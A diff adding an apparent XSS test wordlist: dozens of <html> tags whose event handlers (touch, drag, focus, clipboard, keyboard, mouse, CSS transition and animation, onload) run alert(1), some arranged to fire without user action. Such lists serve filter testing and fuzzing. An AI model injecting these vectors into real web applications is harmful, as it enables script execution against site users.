@@ -1,0 +1,45 @@
+<html ontouchstart=alert(1)> 
+<html ontouchend=alert(1)> 
+<html ontouchmove=alert(1)> 
+<html ontouchcancel=alert(1)>
+<html draggable="true" ondrag="alert(1)">test</html>
+<html draggable="true" ondragend="alert(1)">test</html>
+<html draggable="true" ondragenter="alert(1)">test</html>
+<html draggable="true" ondragleave="alert(1)">test</html>
+<html draggable="true" ondragstart="alert(1)">test</html>
+<html id=x tabindex=1 onactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
+<html id=x tabindex=1 onbeforedeactivate=alert(1)></html><input autofocus>
+<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
+<html id=x tabindex=1 onfocus=alert(1)></html>
+<html id=x tabindex=1 onfocusin=alert(1)></html>
+<html onbeforecopy="alert(1)" contenteditable>test</html>
+<html onbeforecut="alert(1)" contenteditable>test</html>
+<html onbeforepaste="alert(1)" contenteditable>test</html>
+<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onclick="alert(1)">test</html>
+<html oncontextmenu="alert(1)">test</html>
+<html oncopy="alert(1)" contenteditable>test</html>
+<html oncut="alert(1)" contenteditable>test</html>
+<html ondblclick="alert(1)">test</html>
+<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
+<html onkeydown="alert(1)" contenteditable>test</html>
+<html onkeypress="alert(1)" contenteditable>test</html>
+<html onkeyup="alert(1)" contenteditable>test</html>
+<html onmousedown="alert(1)">test</html>
+<html onmouseenter="alert(1)">test</html>
+<html onmouseleave="alert(1)">test</html>
+<html onmousemove="alert(1)">test</html>
+<html onmouseout="alert(1)">test</html>
+<html onmouseover="alert(1)">test</html>
+<html onmouseup="alert(1)">test</html>
+<html onpaste="alert(1)" contenteditable>test</html>
+<style>:target {color: red;}</style><html id=x style="transition:color 10s" ontransitioncancel=alert(1)></html>
+<style>:target {color:red;}</style><html id=x style="transition:color 1s" ontransitionend=alert(1)></html>
+<style>:target {transform: rotate(180deg);}</style><html id=x style="transition:transform 2s" ontransitionrun=alert(1)></html>
+<style>@keyframes slidein {}</style><html style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></html>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style="position:absolute;" onanimationcancel="alert(1)"></html>
+<style>@keyframes x{}</style><html style="animation-name:x" onanimationend="alert(1)"></html>
+<style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
+<svg><html onload=alert(1)></html>
+<html xmlns="http://www.w3.org/1999/xhtml">
